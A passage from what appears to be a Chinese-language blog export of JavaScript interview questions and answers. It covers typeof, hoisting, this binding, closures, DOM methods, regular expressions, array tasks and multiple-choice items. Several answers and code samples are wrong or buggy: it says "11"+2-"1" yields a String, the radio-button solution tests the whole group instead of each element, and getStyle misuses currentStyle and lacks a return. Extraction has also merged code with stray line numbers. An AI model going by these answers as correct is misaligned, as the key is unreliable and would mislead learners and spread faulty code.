&quot;object&quot;typeof null; &quot;object&quot;typeof undefined; &quot;undefined&quot;typeof [1,2,3]; &quot;object&quot;typeof function()&#123;&#125;; //&quot;function&quot; 第9题： 1234parseInt(3.14); //3parseFloat(&quot;3asdf&quot;); //3parseInt(&quot;1.23abc456&quot;);parseInt(true);//&quot;true&quot; NaN 第10题： 12345678//考点：函数声明提前function bar() &#123; return foo; foo = 10; function foo() &#123;&#125; //var foo = 11;&#125;alert(typeof bar());//&quot;function&quot; 第11题：考点：函数声明提前 12345678var foo = 1;function bar() &#123; foo = 10; return; function foo() &#123;&#125;&#125;bar();alert(foo);// 1 第12题： 1234console.log(a);//是一个函数var a = 3;function a()&#123;&#125;console.log(a);////3 第13题： 123456//考点：对arguments的操作function foo(a) &#123; arguments[0] = 2; alert(a);//答案：2，因为：a、arguments是对实参的访问，b、通过arguments[i]可以修改指定实参的值&#125;foo(1); 第14题： 1234function foo(a) &#123; alert(arguments.length);//答案：3，因为arguments是对实参的访问&#125;foo(1, 2, 3); 第15题: 12345678910bar();//报错var foo = function bar(name) &#123; console.log(&quot;hello&quot;+name); console.log(bar);&#125;;//alert(typeof bar);foo(&quot;world&quot;);//&quot;hello&quot;console.log(bar);//undefinedconsole.log(foo.toString());bar();//报错 第16题：以下执行会有什么输出 1234567function test()&#123; console.log(&quot;test函数&quot;);&#125;setTimeout(function()&#123; console.log(&quot;定时器回调函数&quot;);&#125;, 0)test(); 结果： test函数定时器回调函数 选择题以下哪些是javascript的全局函数：( ABC ) A. escape 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。ECMAScript v3 反对使用该方法，应用使用 decodeURI() 和 decodeURIComponent() 替代它。B. parseFloat parseFloat() 函数可解析一个字符串，并返回一个浮点数。该函数指定字符串中的首个字符是否是数字。如果是，则对字符串进行解析，直到到达数字的末端为止，然后以数字返回该数字，而不是作为字符串。C. eval 函数可计算某个字符串，并执行其中的的 JavaScript 代码。D. setTimeoutE. alert 关于IE的window对象表述正确的有：( ACD ) A. window.opener属性本身就是指向window对象B. window.reload()方法可以用来刷新当前页面 应该是location.reload或者window.location.reloadC. window.location=”a.html”和window.location.href=”a.html”的作用都是把当前页面替换成a.html页面D. 定义了全局变量g；可以用window.g的方式来存取该变量 下面正确的是 ( A ) A: 跨域问题能通过JsonP方案解决B：不同子域名间仅能通过修改window.name解决跨域还可以通过script标签src，jsonp等h5 Java split等C：只有在IE中可通过iframe嵌套跨域D：MediaQuery属性是进行视频格式检测的属性是做响应式的 错误的是 ( B ) A: Ajax本质是XMLHttpRequestB: 块元素实际占用的宽度与它的width、border、padding属性有关，与background无关C: position属性absolute、fixed、—relative—会使文档脱标D: float属性left也会使div脱标]]></content>
      <categories>
        <category>题库系列</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[题库-js篇(上)]]></title>
    <url>%2F2016%2F04%2F28%2F%E9%A2%98%E5%BA%93-js%E7%AF%87%EF%BC%88%E4%B8%8A%EF%BC%89%2F</url>
    <content type="text"><![CDATA[1、javascript 的 typeof 返回哪些数据类型123456789alert(typeof [1, 2]); //'object'alert(typeof 'leipeng'); //'string'var i = true; alert(typeof i); //'boolean'alert(typeof 1); //'number'var a; alert(typeof a); //'undefined'function a()&#123;;&#125;;alert(typeof a) //'function' 2、 3 种强制类型转换和 2 种隐式类型转换 强制（parseInt(),parseFloat(),Number()）隐式（== ,!!） 3、split() 、join() 的区别前者是将字符串切割成数组的形式，后者是将数组转换成字符串 4、数组方法pop()、push()、unshift()、shift() Push()尾部添加 pop()尾部删除 Unshift()头部添加 shift()头部删除 5、事件绑定和普通事件有什么区别普通添加事件的方法： 1234567var btn = document.getElementById("hello");btn.onclick = function() &#123; alert(1);&#125;btn.onclick = function() &#123; alert(2);&#125; 执行上面的代码只会 alert 2 事件绑定方式添加事件： 1234567var btn = document.getElementById("hello");btn.addEventListener("click", function() &#123; alert(1);&#125;,false);btn.addEventListener("click", function() &#123; alert(2);&#125;,false); 执行上面的代码会先 alert 1 再 alert 2 普通添加事件的方法不支持添加多个事件，最下面的事件会覆盖上面的，而事件绑定（addEventListener）方式添加事件可以添加多个。addEventListener不兼容低版本IE；普通事件无法取消；addEventLisntener还支持事件冒泡+事件捕获 6、IE和DOM事件流的区别 执行顺序不一样参数不一样事件加不加onthis指向问题 7、IE和标准下有哪些兼容性的写法123var ev = ev || window.event;document.documentElement.clientWidth || document.body.clientWidth;var target = ev.srcElement||ev.target; 8、call、apply和bind的区别call方法: 语法：call(thisObj，Object1,Object2…) 定义：调用一个对象的一个方法，以另一个对象替换当前对象。 说明： call 方法可以用来代替另一个对象调用一个方法。call 方法可将一个函数的对象上下文从初始的上下文改变为由 thisObj 指定的新对象。如果没有提供 thisObj 参数，那么 Global 对象被用作 thisObj。 apply方法： 语法：apply(thisObj，[argArray]) 定义：应用某一对象的一个方法，用另一个对象替换当前对象。 说明： 如果 argArray 不是一个有效的数组或者不是 arguments 对象，那么将导致一个 TypeError。如果没有提供 argArray 和 thisObj 任何一个参数，那么 Global 对象将被用作 thisObj，并且无法被传递任何参数。 bind 方法： bind方法传递给调用函数的参数可以逐个列出，也可以写在数组中。bind方法与call、apply最大的不同就是前者返回一个绑定上下文的函数，而后两者是直接执行了函数该方法创建一个新函数，称为绑定函数，绑定函数会以创建它时传入bind方法的第一个参数作为this;传入bind方法的第二个以及以后的参数加上绑定函数运行时本身的参数按照顺序作为原函数的参数来调用原函数。 js中call、apply、bind的用法 9、函数调用、this指向、返回值一个函数最终产生什么样的结构，跟如何调用这个函数息息相关：函数的四种调用模式 函数的 4 种调用模式 第一种模式：函数调用模式，也就是写一个函数，然后调用一下 第二种模式：方法调用模式，也就是将函数成为对象的一个方法，然后通过对象来调用 第三种模式：构造函数调用模式，也就是将函数当成构造函数来调用 第四种调用模式：上下文调用模式，根据调用方式的不同可以产生不同的结果 第四种函数调用的实现方式 实现方式：call/apply (apply 和 call 的唯一区别是第二个参数是数组，将实参值一一传到数组中。fn.call (函数内部的 this 的值,实参1，实参2…)) 不同调用模式中的this的值 函数调用模式中 this 指向：window 方法调用模式中 this 指向：调用的对象 构造函数调用模式中 this 指向：构造函数的实例 上下文调用模式中 this 指向： (1) 如果 call 方法的第一个参数是一个对象，则 fn 函数内部的 this 的值指向该对象 (2) 如果 call 方法的第一个参数是一个字符串、数字、布尔值，则 fn 函数内部的 this 的值会转换为该类型所对应的基本包装类型的对象 (3) 如果 call 方法的第一个参数是 null ，则 fn 函数内部的 this 的值是 window ——&gt; 就相当于是一次函数调用模式 调用模式中的返回值 函数调用模式中返回值：由 return 语句决定 方法调用模式中返回值：由 return 语句决定 构造函数调用模式中的返回值： (1). 如果构造函数没有手动设置返回值，那么会返回构造函数的实例 (2). 如果手动给构造函数添加了返回值，有以下2种情况： (a). 返回值是值类型：最终的返回值还是构造函数的实例 (b). 返回值是引用类型(对象)：最终的返回值就是该对象 上下文调用模式中的返回值：由 return 语句决定10、b 继承 a 的方法 1234567891011121314function A( age, name )&#123; this.age = age; this.name = name; &#125;A.prototype.show = function()&#123; alert('父级方法'); &#125;function B(age,name,job)&#123; A.apply( this, arguments ); this.job = job; &#125; B.prototype = new A();var b = new A(14,'侠客行'); var a = new B(15,'狼侠','侠客'); 11、如何阻止事件冒泡和默认事件 canceBubble() 只支持 IE,return false,stopPropagation() 12、添加、删除、替换、插入到某个接点的方法1234domObj.appendChild();domObj.insertBefore();domObj.replaceChild();domObj.removeChild(); 13、javascript的本地对象，内置对象和宿主对象 本地对象为 Array Object Regexp 等可以 new 实例化内置对象为 Global Math 等不可以实例化的宿主为浏览器自带的 document, window 等 14. window.onload 和 document ready 的区别 window.onload 是在dom文档树加载完和所有文件加载完之后执行一个函数;Document.ready 原生种没有这个方法，jquery中有 $().ready(function),在dom文档树加载完之后执行一个函数注意，这里面的文档树加载完不代表全部文件加载完。$(document).ready 要比 window.onload 先执行window.onload只能出来一次，$(document).ready 可以出现多次 15、”==” 和 “===” 的不同前者会自动转换类型，后者不会 16、javascript的同源策略 一段脚本只能读取来自于同一来源的窗口和文档的属这里的同一来源指的是主机名、议和端口号的组合 17、JavaScript 是一门什么样的语言，它的特点javaScript 一种直译式脚本语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型。它的解释器被称为 JavaScript 引擎，为浏览器的一部分，广泛用于客户端的脚本语言，最早是在 HTML 网页上使用，用来给 HTML 网页增加动态功能。JavaScript 兼容于 ECMA 标准，因此也称为 ECMAScript。 基本特点： 是一种解释性脚本语言（代码不进行预编译）。主要用来向HTML（标准通用标记语言下的一个应用）页面添加交互行为。可以直接嵌入HTML页面，但写成单独的js文件有利于结构和行为的分离。跨平台特性，在绝大多数浏览器的支持下，可以在多种平台下运行（如Windows、Linux、Mac、Android、iOS等）。 18、JavaScript的数据类型 基本数据类型：String, boolean, Number, Undefined, Null引用数据类型：Object(Array, Date, RegExp, Function) 如何判断某变量是否为数组数据类型? 方法一.判断其是否具有“数组性质”，如slice()方法。可自己给该变量定义 slice 方法，故有时会失效方法二.obj instanceof Array 在某些 IE 版本中不正确方法三.方法一二皆有漏洞，在 ECMAScript5 中定义了新方法 Array.isArray(), 保证其兼容性，最好的方法如下： 12345if(typeof Array.isArray==="undefined") &#123; Array.isArray = function(arg)&#123; return Object.prototype.toString.call(arg)==="[object Array]"; &#125;;&#125; 19. 已知 ID 的 Input 输入框，获取这个输入框的输入值，怎么做？ document.getElementById(“ID”).value; 20、获取到页面中所有 checkbox12345678var domList = document.getElementsByTagName('input');var checkBoxList = [];var len = domList.length; //缓存到局部变量while (len--) &#123; //使用while的效率会比for循环更高 if (domList[len].type == 'checkbox') &#123; checkBoxList.push(domList[len]); &#125;&#125; 21. 设置一个已知 ID 的 DIV 的 html 内容为 xxxx ，字体颜色设置为黑色123var dom = document.getElementById("ID");dom.innerHTML = "xxxx"dom.style.color = "#000" 22. 当一个 DOM 节点被点击时候能够执行一个函数 直接在DOM里绑定事件：&lt;div onclick=&quot;test()&quot;&gt;&lt;/div&gt;在 JS 里通过 onclick 绑定：xxx.onclick = test;通过事件添加进行绑定：addEventListener(xxx, ‘click’, test); Javascript的事件流模型都有什么？ “事件冒泡”：事件开始由最具体的元素接受，然后逐级向上传播“事件捕捉”：事件由最不具体的节点先接收，然后逐级向下，一直到最具体的“DOM事件流”：三个阶段：事件捕捉，目标阶段，事件冒泡 23. 代码题undefined、 报错123var a;alert(typeof a); // "undefined"alert(b); // 报错 解释：undefined 是一个只有一个值的数据类型，这个值就是 “undefined”，在使用var声明变量但并未对其赋值进行初始化时，这个变量的值就是undefined。而b由于未声明将报错。未申明的变量和声明了未赋值的是不一样的。 typeof12var a = null;alert(typeof a); //object 解释： null是一个只有一个值的数据类型，这个值就是 null。表示一个空指针对象，所以用 typeof 检测会返回 “object”。 “==” 运算符123456789var undefined;undefined == null; // true1 == true; // true2 == true; // false0 == false; // true0 == ''; // trueNaN == NaN; // false[] == false; // true[] == ![]; // true undefined 与 null 相等，但不恒等（===）一个是 number 一个是string时，会尝试将 string 转换为 number尝试将 boolean 转换为number，0或1尝试将 Object 转换成 number 或 string ，取决于另外一个对比量的类型所以，对于0、空字符串的判断，建议使用 “===”“===”会先判断两边的值类型，类型不匹配时为 false。 类型转换123var foo = "11" + 2 - "1";console.log(foo);console.log(typeof foo); 执行完后foo的值为111，foo的类型为String。 词法作用域(1)123for (i = 0, j = 0; i &lt; 10, j &lt; 6; i++, j++) &#123; k = i + j;&#125; (2)123456789function f1()&#123; var tmp = 1; this.x = 3; console.log(tmp); //A console.log(this.x)；//B&#125;var obj = new f1(); //1console.log(obj.x) //2console.log(f1()); //3 这里实例话化了 f1 这个类。相当于执行了 f1 函数。所以这个时候 A 会输出 1而 B 这个时候的 this 代表的是实例化的当前对象 obj B 输出 3。代码（2）毋庸置疑会输出 3.重点 代码（3）首先这里将不再是一个类，它只是一个函数。那么 A 输出 1，B呢？这里的this 代表的其实就是 window 对象，那么 this.x 就是一个全局变量,相当于在外部的一个全局变量。所以 B 输出 3。最后代码由于 f 没有返回值那么一个函数如果没返回值的话，将会返回 underfined ，所以答案就是: 1, 3, 3, 1, 3, underfined。 (3)12345var a = 6;setTimeout(function () &#123; var a = 666; alert(a); // 输出666，&#125;, 1000); 因为var a = 666;定义了局部变量a，并且赋值为666，根据变量作用域链，全局变量处在作用域末端，优先访问了局部变量，从而覆盖了全局变量 。 (4)12345var a = 6;setTimeout(function () &#123; alert(a); // 输出undefined var a = 666;&#125;, 1000); (5) 因为var a = 666;定义了局部变量a，同样覆盖了全局变量，但是在alert(a);之前a并未赋值，所以输出undefined。 12345678var a = 6; setTimeout(function()&#123; alert(a); var a = 66; &#125;, 1000);a = 666; alert(a); // 666, undefined; 记住： 异步处理，一切 OK 声明提前 (5)12345678function setN(obj)&#123; obj.name='屌丝'; obj = new Object(); obj.name = '腐女';&#125;;var per = new Object();setN(per);alert(per.name); //屌丝 内部 (6)123456var foo = 1;(function()&#123; console.log(foo); var foo = 2; console.log(foo);&#125;)(); 输出undefined 和 2。 上面代码相当于： 1234567var foo = 1;(function()&#123; var foo; console.log(foo); //undefined foo = 2; console.log(foo); // 2; &#125;)(); 函数声明与变量声明会被JavaScript引擎隐式地提升到当前作用域的顶部但是只提升名称不会提升赋值部分 (7)123456789101112function foo()&#123; foo.a = function()&#123; alert(1); &#125;; this.a = function()&#123; alert(2); &#125;; a = function()&#123; alert(3); &#125;; var a = function()&#123; alert(4); &#125;;&#125;; foo.prototype.a = function()&#123;alert(5);&#125;;foo.a = function()&#123;alert(6);&#125;;foo.a(); //6var obj = new foo();obj.a(); //2foo.a(); //1 (7)12345678910var a = 5; function test()&#123; a = 0; alert(a); alert(this.a); //没有定义 a这个属性 var a; alert(a)&#125;test(); // 0, 5, 0new test(); // 0, undefined, 0 //由于类它自身没有属性a， 所以是undefined 引用类型(1)12345var a = new Object();a.value = 1;b = a;b.value = 2;alert(a.value); // 2 (2)1234var o1 = new Object();var o2 = o1;o2.name = &quot;CSSer&quot;;console.log(o1.name); 如果不看答案，你回答真确了的话，那么说明你对javascript的数据类型了解的还是比较清楚了。js中有两种数据类型，分别是：基本数据类型和引用数据类型（object Array）。对于保存基本类型值的变量，变量是按值访问的，因为我们操作的是变量实际保存的值。对于保存引用类型值的变量，变量是按引用访问的，我们操作的是变量值所引用（指向）的对象。答案就清楚了： //CSSer; (3)12345678function changeObjectProperty (o) &#123; o.siteUrl = &quot;http://www.csser.com/&quot;; o = new Object(); o.siteUrl = &quot;http://www.popcg.com/&quot;;&#125;var CSSer = new Object();changeObjectProperty(CSSer);console.log(CSSer.siteUrl); // 如果CSSer参数是按引用传递的，那么结果应该是http://www.popcg.com/，但实际结果却仍是http://www.csser.com/。事实是这样的：在函数内部修改了引用类型值的参数，该参数值的原始引用保持不变。我们可以把参数想象成局部变量，当参数被重写时，这个变量引用的就是一个局部变量，局部变量的生存期仅限于函数执行的过程中，函数执行完毕，局部变量即被销毁以释放内存。 补充：内部环境可以通过作用域链访问所有的外部环境中的变量对象，但外部环境无法访问内部环境。每个环境都可以向上搜索作用域链，以查询变量和函数名，反之向下则不能。 JS的继承性123456789window.color = 'red';var o = &#123;color: 'blue'&#125;;function sayColor()&#123; alert(this.color);&#125;sayColor(); //redsayColor.call(this); //red this-window对象sayColor.call(window); //redsayColor.call(o); //blue 精度问题: JS 精度不能精确到 0.11234var n = 0.3,m = 0.2, i = 0.2, j = 0.1;alert((n - m) == (i - j)); //falsealert((n-m) == 0.1); //falsealert((i-j)==0.1); //true 加减运算1234alert(&apos;5&apos;+3); //53 stringalert(&apos;5&apos;+&apos;3&apos;); //53 stringalert(&apos;5&apos;-3); //2 numberalert(&apos;5&apos;-&apos;3&apos;); //2 number foo = foo||barfoo = foo||bar，这行代码是什么意思？为什么要这样写？ 1if(!foo) foo = bar; //如果foo存在，值不变，否则把bar的值赋给foo 短路表达式： 作为 “&amp;&amp;” 和 “||” 操作符的操作数表达式，这些表达式在进行求值时，只要最终的结果已经可以确定是真或假，求值过程便告终止，这称之为短路求值。 闭包一个例子12345for(var i=1;i&lt;=3;i++)&#123; setTimeout(function()&#123; console.log(i); &#125;,0); &#125;; 结果：4 4 4原因：JavaScript 事件处理器在线程空闲之前不会运行。如何让上述代码输出1 2 3？ 12345for(var i=1;i&lt;=3;i++)&#123; setTimeout((function(a)&#123; //改成立即执行函数 console.log(a); &#125;)(i), 0); &#125;; ++a 和 a++12345var a=10, b=20 , c=30;++a;a++;e=++a+(++b)+(c++)+a++;alert(e); // 77 日期函数12345678function DateDemo () &#123; var d, s="今天日期是："; d = new Date(); s += d.getMonth() +1+ "/"; s += d.getDate() + "/"; s += d.getFullYear(); return s;&#125; k 的结果：10 数组 concat() 方法12345var arr = new Array(1, 3, 5);arr[4]='z';arr2 = arr.reverse();arr3 = arr.concat(arr2);alert(arr3); // z,,5,3,1,z,,5,3,1 24、编程题计算字符串字节数123456789new function(s)&#123; if(!arguments.length||!s) return null; if(""==s) return 0; var l=0; for(var i=0;i&lt;s.length;i++)&#123; if(s.charCodeAt(i)&gt;255) l+=2; else l+=1; //charCodeAt()得到的是unCode码 &#125; //汉字的unCode码大于 255bit 就是两个字节 alert(l); &#125;("hello world!"); join()已知数组 var stringArray = [“This”, “is”, “Baidu”, “Campus”]; alert 出”This is Baidu Campus”。 alert(stringArray.join(“ “)); charAt(0)、toUpperCase()已知有字符串foo=&quot;get-element-by-id&quot;,写一个 function 将其转化成驼峰表示法 “getElementById”。 12345678function combo(msg)&#123; var arr=msg.split("-"); for(var i=1;i&lt;arr.length;i++)&#123; arr[i]=arr[i].charAt(0).toUpperCase()+arr[i].substr(1,arr[i].length-1); &#125; msg=arr.join(""); return msg;&#125; 数组倒排var numberArray = [3,6,2,4,1,5]; 1) 实现对该数组的倒排，输出[5,1,4,2,6,3] numberArray.reverse() 2) 实现对该数组的降序排列，输出[6,5,4,3,2,1] numberArray.sort(function(a,b){return b-a}); 日期 Date()输出今天的日期，以 YYYY-MM-DD 的方式，比如今天是 2015 年 7 月 14 日，则输出 2015-07-14 1234567891011var d = new Date();// 获取年，getFullYear()返回4位的数字var year = d.getFullYear();// 获取月，月份比较特殊，0是1月，11是12月var month = d.getMonth() + 1;// 变成两位month = month &lt; 10 ? '0' + month : month;// 获取日var day = d.getDate();day = day &lt; 10 ? '0' + day : day;alert(year + '-' + month + '-' + day); 正则替换将字符串&quot;&lt;tr&gt;&lt;td&gt;{$id}&lt;/td&gt;&lt;td&gt;{$name}&lt;/td&gt;&lt;/tr&gt;&quot;中的{$id}替换成10，{$name}替换成 Tony（使用正则表达式） 1&quot;&lt;tr&gt;&lt;td&gt;&#123;$id&#125;&lt;/td&gt;&lt;td&gt;&#123;$id&#125;_&#123;$name&#125;&lt;/td&gt;&lt;/tr&gt;&quot;.replace(/&#123;\$id&#125;/g, &apos;10&apos;).replace(/&#123;\$name&#125;/g, &apos;Tony&apos;); 转义为了保证页面输出安全，我们经常需要对一些特殊的字符进行转义，请写一个函数 escapeHtml，将&lt;, &gt;, &amp;, “进行转义 1234567891011121314function escapeHtml(str) &#123; return str.replace(/[&lt;&gt;"&amp;]/g, function(match) &#123; switch (match) &#123; case "&lt;": return "&amp;lt;"; case "&gt;": return "&amp;gt;"; case "&amp;": return "&amp;amp;"; case "\"": return "&amp;quot;"; &#125; &#125;);&#125; 随机数用 js 实现随机选取 10–100 之间的 10 个数字，存入一个数组，并排序。 1234567891011121314151617181920212223function randomNub(aArray, len, min, max) &#123; if (len &gt;= (max - min)) &#123; return '超过' + min + '-' + max + '之间的个数范围' + (max - min - 1) + '个的总数'; &#125; if (aArray.length &gt;= len) &#123; aArray.sort(function(a, b) &#123; return a - b &#125;); return aArray; &#125; var nowNub = parseInt(Math.random() * (max - min - 1)) + (min + 1); for (var j = 0; j &lt; aArray.length; j++) &#123; if (nowNub == aArray[j]) &#123; randomNub(aArray, len, min, max); return; &#125; &#125; aArray.push(nowNub); randomNub(aArray, len, min, max); return aArray;&#125;var arr=[];randomNub(arr,10,10,100); 生成5个不同的随机数；12345678910//思路：5个不同的数，每生成一次就和前面的所有数字相比较，如果有相同的，则放弃当前生成的数字！var num1 = [];for(var i = 0; i &lt; 5; i++)&#123; num1[i] = Math.floor(Math.random()*10) + 1; //范围是 [1, 10] for(var j = 0; j &lt; i; j++)&#123; if(num1[i] == num1[j])&#123; i--; &#125; &#125;&#125; 合并数据并删除某个指定下标元素把两个数组合并，并删除第二个元素。 1234var array1 = [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;];var bArray = [&apos;d&apos;,&apos;e&apos;,&apos;f&apos;];var cArray = array1.concat(bArray);cArray.splice(1,1); DOM 节点操作添加、移除、移动、复制、创建和查找节点（原生JS） 1）创建新节点 123document.createDocumentFragment() //创建一个DOM片段document.createElement() //创建一个具体的元素document.createTextNode() //创建一个文本节点 2）添加、移除、替换、插入 1234domObj.appendChild(); //添加domObj.removeChild(); //移除domObj.replaceChild(); //替换domObj.insertBefore(); //插入 3）查找 123document.getElementsByTagName() //通过标签名称document.getElementsByName() //通过元素的Name属性的值document.getElementById() //通过元素Id，唯一性 URL 解析成 json 对象有这样一个 URL：http://item.taobao.com/item.htm?a=1&amp;b=2&amp;c=&amp;d=xxx&amp;e，请写一段 JS 程序提取 URL 中的各个 GET 参数(参数名和参数个数不确定)，将其按 key-value 形式返回到一个 json 结构中，如 {a:’1′, b:’2′, c:”, d:’xxx’, e:undefined}。 1234567891011121314function serilizeUrl(url) &#123; var urlObject = &#123;&#125;; if (/\?/.test(url)) &#123; var urlString = url.substring(url.indexOf(&quot;?&quot;) + 1); var urlArray = urlString.split(&quot;&amp;&quot;); for (var i = 0, len = urlArray.length; i &lt; len; i++) &#123; var urlItem = urlArray[i]; var item = urlItem.split(&quot;=&quot;); urlObject[item[0]] = item[1]; &#125; return urlObject; &#125; return null;&#125; 正则表达式和正则字面量区别正则表达式构造函数var reg=new RegExp(&quot;xxx&quot;)与正则表达字面量var reg=//有什么不同，匹配邮箱的正则表达式。 当使用 RegExp() 构造函数的时候，不仅需要转义引号（即 \” 表示 “），还需要双反斜杠（即\表示一个\）。使用正则表达字面量的效率更高。 邮箱的正则匹配： 1var regMail = /^([a-zA-Z0-9_-])+@([a-zA-Z0-9_-])+((.[a-zA-Z0-9_-]&#123;2,3&#125;)&#123;1,2&#125;)$/; 正则表达式写出简单描述 html 标签（不带属性的开始标签和结束标签）的正则表达式，并将var str = &quot;&lt;div&gt;这里是div&lt;p&gt;里面的段落&lt;/p&gt;&lt;/div&gt;&quot;;字符串中的 html 标签去除掉 123var reg = /&lt;\/?\w+\/?&gt;/gi;var str = &quot;&lt;div&gt;这里是div&lt;p&gt;里面的段落&lt;/p&gt;&lt;/div&gt;&quot;;alert(str.replace(reg,&quot; &quot;)); 清除字符串前后的空格写一个function，清除字符串前后的空格。（兼容所有浏览器）使用自带接口 trim()，考虑兼容性。 12345678if (!String.prototype.trim) &#123; String.prototype.trim = function() &#123; return this.replace(/^\s+/, &quot;&quot;).replace(/\s+$/,&quot;&quot;); &#125;&#125;// test the function var str = &quot; \t\n test string &quot;.trim(); alert(str == &quot;test string&quot;); // alerts &quot;true&quot; Javascript中 callee 和 caller 的作用 caller是返回一个对函数的引用，该函数调用了当前函数；callee是返回正在被执行的 function 函数，也就是所指定的 function 对象的正文。 如果一对兔子每月生一对兔子；一对新生兔，从第二个月起就开始生兔子；假定每对兔子都是一雌一雄，试问一对兔子，第n个月能繁殖成多少对兔子？（使用callee完成） 12345678910111213141516var result = [];function fn(n) &#123; //典型的斐波那契数列 if (n == 1) &#123; return 1; &#125; else if (n == 2) &#123; return 1; &#125; else &#123; if (result[n]) &#123; return result[n]; &#125; else &#123; //argument.callee()表示fn() result[n] = arguments.callee(n - 1) + arguments.callee(n - 2); return result[n]; &#125; &#125;&#125; 数组去重方法一: 每遍历一次就和之前的所有做比较，不相等则放入新的数组中！ 123456789101112131415//这里用的原型 个人做法；Array.prototype.unique = function()&#123; var len = this.length, newArr = [], flag = 1; for(var i = 0; i &lt; len; i++, flag = 1)&#123; for(var j = 0; j &lt; i; j++)&#123; if(this[i] == this[j])&#123; flag = 0; //找到相同的数字后，不执行添加数据 &#125; &#125; flag ? newArr.push(this[i]) : ''; &#125; return newArr;&#125; 方法二： 1234567891011121314var arr=[1,2,3,3,4,4,5,5,6,1,9,3,25,4];Array.prototype.unique2 = function()&#123; var n = []; //一个新的临时数组 for(var i = 0; i &lt; this.length; i++) //遍历当前数组 &#123; //如果当前数组的第i已经保存进了临时数组，那么跳过， //否则把当前项push到临时数组里面 if (n.indexOf(this[i]) == -1) n.push(this[i]); &#125; return n;&#125;var newArr2=arr.unique2(arr);alert(newArr2); //输出1,2,3,4,5,6,9,25 阶乘函数；12345678910//原型方法Number.prototype.N = function()&#123; var re = 1; for(var i = 1; i &lt;= this; i++)&#123; re *= i; &#125; return re;&#125;var num = 5;alert(num.N()); 判断一个字符串中出现次数最多的字符，统计这个次数123456789101112131415161718var str = 'asdfssaaasasasasaa';var json = &#123;&#125;;for (var i = 0; i &lt; str.length; i++) &#123; if(!json[str.charAt(i)])&#123; json[str.charAt(i)] = 1; &#125; else &#123; json[str.charAt(i)]++; &#125;&#125;;var iMax = 0;var iIndex = '';for (var i in json) &#123; if(json[i]&gt;iMax)&#123; iMax = json[i]; iIndex = i; &#125;&#125;alert('出现次数最多的是:' + iIndex + '出现' + iMax + '次'); 写一个获取非行间样式的函数1234567891011function getStyle (obj, attr, value) &#123; if(!value) &#123; if(obj.currentStyle) &#123; return obj.currentStyle(attr); &#125; else &#123; obj.getComputedStyle(attr,false); &#125; &#125; else &#123; obj.style[attr] = value; &#125;&#125; confirm 确认用户是否退出当前页面，确认之后关闭窗补充按钮事件的函数，确认用户是否退出当前页面，确认之后关闭窗? 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;script type=”text/javascript” &gt; function closeWin()&#123; //在此处添加代码 if(confirm("确定要退出吗？"))&#123; window.close(); &#125; &#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;input type=”button”value=”关闭窗口”onclick=”closeWin()”/&gt;&lt;/body&gt;&lt;/html&gt; 选中单选框完成foo()函数的内容，要求能够弹出对话框提示当前选中的是第几个单选框。 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;metahttp-equiv="Content-Type" content="text/html;charset=utf-8" /&gt;&lt;/head&gt;&lt;body&gt;&lt;script type="text/javascript" &gt; function foo() &#123; //在此处添加代码 var rdo = document.form1.radioGroup; for(var i = 0; i &lt; rdo.length; i++) &#123; if(rdo.checked) &#123; alert(“您选择的是第”+(i+1)+”个单选框”); &#125; &#125; &#125;&lt;/script&gt;&lt;body&gt; &lt;form name="form1" &gt; &lt;input type="radio" name="radioGroup"/&gt; &lt;input type="radio" name="radioGroup"/&gt; &lt;input type="radio" name="radioGroup"/&gt; &lt;input type="radio" name="radioGroup"/&gt; &lt;input type="submit"/&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 根据下拉列表显示图片完成函数showImg()，要求能够动态根据下拉列表的选项变化，更新图片的显示 12345678910111213141516&lt;body&gt; &lt;script type="text/javascript" &gt; function showImg (oSel) &#123; //在此处添加代码 var str = oSel.value; document.getElementById("pic").src= str + ".jpg"; &#125; &lt;/script&gt; &lt;img id="pic" src="img1.jpg" width="200" height="200" /&gt; &lt;br /&gt; &lt;select id="sel"&gt; &lt;option value="img1"&gt;城市生活&lt;/option&gt; &lt;option value="img2"&gt;都市早报&lt;/option&gt; &lt;option value="img3"&gt;青山绿水&lt;/option&gt; &lt;/select&gt;&lt;/body&gt; 截取字符串截取字符串 abcdefg 的 efg alert(&#39;abcdefg&#39;.substring(4)); 25、程序选择题Javascript中, 以下哪条语句一定会产生运行错误？ ( BC ) A、var _变量=NaN; B、var 0bj = []; C、var obj = //; D、var obj = {}; 以下两个变量 a 和 b，a + b 的哪个结果是 NaN？ ( AC ) A、var a=undefined; b=NaN B、var a= ‘123’; b=NaN C、var a =undefined , b =NaN D、var a=NaN , b=’undefined’ var a=10; b=20; c=4; ++b+c+a++ 以下哪个结果是正确的？( B ) A、34 B、35 C、36 D、37 要将页面的状态栏中显示“已经选中该文本框”，下列JavaScript语句正确的是 ( A ) A. window.status=”已经选中该文本框” B. document.status=”已经选中该文本框” C. window.screen=”已经选中该文本框” D. document.screen=”已经选中该文本框” 以下哪条语句会产生运行错误：( AD ) A.var obj = (); B.var obj = []; C.var obj = {}; D.var obj = //; 以下哪个单词不属于 javascript 保留字：( B ) A.with B.parent C.class D.void 请选择结果为真的表达式：( C ) A.null instanceof Object B.null === undefined C.null == undefined D.NaN == NaN 26、填空题Javascript中, 如果已知HTML页面中的某标签对象的id=”username”，用(…)方法获得该标签对象。 document.getElementById(“username”); typeof运算符返回值中有一个跟javascript数据类型不一致，它是(…)。 function 定义了一个变量，但没有为该变量赋值，如果 alert 该变量，javascript 弹出的对话框中显示(…)。 undefined 27、列举浏览器对象模型 BOM 里常用的至少 4 个对象，并列举 window 7象的常用方法至少 5 个对象： windowdocumentlocationscreenhistorynavigator 方法： alert()confirm()prompt()open()close() 28、简述列举文档对象模型 DOM 里 document 的常用的查找访问节点的方法并做简单说明 Document.getElementById 根据元素id查找元素Document.getElementByName 根据元素name查找元素Document.getElementTagName 根据指定的元素名查找元素 29、简述创建函数的几种方式第一种（函数声明）： 123function sum1(num1,num2)&#123; return num1+num2;&#125; 第二种（函数表达式）： 123var sum2 = function(num1,num2)&#123; return num1+num2;&#125; 第三种（函数对象方式）： 1var sum3 = new Function(&quot;num1&quot;, &quot;num2&quot;, &quot;return 